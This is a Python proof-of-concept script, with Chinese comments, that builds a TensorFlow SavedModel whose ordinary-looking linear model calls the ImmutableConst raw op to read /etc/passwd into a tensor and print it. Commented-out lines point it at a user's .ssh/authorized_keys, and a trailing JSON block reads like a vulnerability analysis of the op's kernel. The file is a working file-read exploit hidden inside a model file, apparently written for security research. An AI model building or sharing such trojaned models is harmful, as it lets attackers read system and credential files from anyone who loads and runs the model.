import tensorflow as tf

class SimpleLinearModel(tf.Module):
    def __init__(self):
        self.a = tf.Variable(3.0)
        self.b = tf.Variable(2.0)
        # self.matching_path = tf.io.matching_files(pattern="/home/*")
        # _, tensor_str = self.mathing_path[0].__reduce__()
        # self.path = tensor_str[0]
        # self.memory_region_name = self.path.decode() + "/.ssh/authorized_keys"

    @tf.function
    def __call__(self, x):
        immutable_tensor = tf.raw_ops.ImmutableConst(
            dtype=tf.int8,
            shape=50,
            # memory_region_name=self.memory_region_name
            memory_region_name="/etc/passwd"

            # 这部分的路径需要是 python 的 string 类型，不能是 string tensor
            )
        ## 读取文件，不能读取tf.string, 但是可以用int8读取ascii码，能够窃取文件内容。（需要用别的API获取到文件路径）
        tf.print(immutable_tensor)
# 保存模型
        return self.a * x + self.b

# 实例化模型
model = SimpleLinearModel()

# 调用模型以收集追踪数据
result = model(tf.constant(5.0))

save_dir = 'model/immutableconst/saved_model'
tf.saved_model.save(model, save_dir)


# /tensorflow/core/kernels/immutable_constant_op.cc
# 98
'''
{
  "user controlled input": {},

  "behavior": ["memory management", "file system interaction (indirectly via MemmappedTensorAllocator)"],

  "Possible abuse": "Yes",

  "Description of abuse": "If an attacker can influence 'region_name_', they might direct the MemmappedTensorAllocator to initialize using a malicious or non-existent memory-mapped file region, potentially causing the application to crash or exhibit undefined behavior. Moreover, if 'dtype_' and 'shape_' are not properly validated or are influenced by an attacker, this could lead to memory corruption, out-of-bounds reads, or exposure of sensitive information due to incorrect tensor allocation size.",

  "Impacts": ["DoS: Crash, Exit, or Restart", "Modify Memory", "Read Memory", "Unexpected State", "Quality Degradation"]
}
'''
